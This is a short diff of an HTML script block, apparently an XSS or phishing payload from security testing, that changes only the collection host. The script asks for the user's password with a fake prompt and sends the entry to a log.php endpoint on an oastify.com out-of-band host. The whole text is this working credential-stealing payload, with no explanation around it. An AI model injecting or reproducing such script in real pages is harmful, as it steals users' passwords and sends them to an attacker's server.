@@ -5,7 +5,7 @@
         <script>
                 var passwd = prompt("Enter your password to continue");
                 var xhr = new XMLHttpRequest();
-                xhr.open("GET","https://d5jprzeie81xz3tygs0mxt9jfal29sxh.oastify.com/log.php?password="+encodeURI(passwd));
+                xhr.open("GET","https://cuankf1ribp6me3zj9a75lg7syyumnac.oastify.com/log.php?password="+encodeURI(passwd));
                 xhr.send();
         </script>
 
